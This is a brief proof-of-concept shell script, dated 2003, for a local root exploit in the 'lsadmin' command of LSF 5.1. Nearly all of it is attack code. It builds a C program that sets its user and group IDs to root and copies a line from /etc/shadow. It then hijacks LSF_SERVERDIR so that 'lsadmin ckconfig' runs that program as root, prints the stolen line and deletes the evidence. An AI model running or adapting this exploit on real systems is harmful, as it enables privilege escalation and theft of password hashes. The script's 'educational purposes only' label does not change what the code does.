# LSF 5.1 'lsadmin' local root exploit
# 2003.03.20 - CADENCE of Lam3rZ

# Proof of concept - for educational purposes only!

cat <<__END__> attacker_code.c
#include <stdio.h>
int main() {
FILE *secret_file;
FILE *temp_file;
char one_line[128];
setuid(0);setgid(0);
secret_file = fopen("/etc/shadow", "r");
temp_file = fopen(".temp.file", "w");
fgets(one_line, 120, secret_file);
fputs(one_line, temp_file);
fclose(secret_file); fclose (temp_file);
}
__END__

gcc attacker_code.c -o lim
chmod 777 lim
export LSF_SERVERDIR=.
lsadmin ckconfig
cat .temp.file
rm -f attacker_code.c lim .temp.file
